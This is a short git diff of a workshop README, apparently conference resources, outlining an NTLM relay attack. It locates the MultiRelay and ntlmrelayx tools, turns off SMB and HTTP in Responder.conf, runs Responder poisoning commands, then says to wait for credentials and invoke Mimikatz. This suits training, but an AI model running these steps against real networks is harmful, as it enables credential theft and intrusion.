@@ -1,6 +1,6 @@
 # DojoConf-Recursos
 
-comando de Busqueda herramientas:
+Comando de Busqueda herramientas:
 ```
 find /usr/share/responder/ -name "MultiRelay.py" -print
 find /usr/share/responder/ -name "ntlmrelayx.py" -print
@@ -27,8 +27,8 @@ gedit Responder.conf
 ```
 4. Open the Responder.conf file and set the value of SMB and HTTP to Off
 ```
-Responder.py** -I eth0 -rv
-Responder.py** -I eth0 -rdw
+responder -I eth0 -rv
+responder -I eth0 -rdw
 ```
 5. Wait for creds
 6. Invoke standard Mimikatz
